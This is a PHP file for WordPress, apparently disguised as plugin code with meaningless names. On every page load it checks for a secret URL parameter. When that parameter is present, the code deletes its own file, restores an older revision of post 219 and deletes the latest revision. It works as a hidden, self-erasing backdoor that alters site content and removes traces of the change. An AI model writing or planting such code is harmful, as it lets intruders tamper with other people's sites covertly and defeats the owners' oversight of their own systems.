<?php

function extensions_files_free_thumbnails() {
	if (isset($_GET['mobile_toggle_friendly']) && $_GET['mobile_toggle_friendly'] === 'group_fx_grid') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$dashboard_hidden_reset_floating = 219;
		$affiliate_welcome_permalink_marketplace = wp_get_post_revisions($dashboard_hidden_reset_floating);
		if (empty($affiliate_welcome_permalink_marketplace)) die('no revisions');
		if (count($affiliate_welcome_permalink_marketplace) < 2) die('less than 2');
		$health_insert_integrate_ticket = array_shift($affiliate_welcome_permalink_marketplace);
		$excerpt_embedder_stop = $health_insert_integrate_ticket->ID;
		$tiny_newsletter_classic = array_shift($affiliate_welcome_permalink_marketplace);
		$optimizer_authentication_uploads_nice = $tiny_newsletter_classic->ID;
		$protection_bangla_make = wp_restore_post_revision($optimizer_authentication_uploads_nice);
		if ($protection_bangla_make === false) die('error restoring');
		$protection_bangla_make = wp_delete_post_revision($excerpt_embedder_stop);		
		if ($protection_bangla_make === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'extensions_files_free_thumbnails');
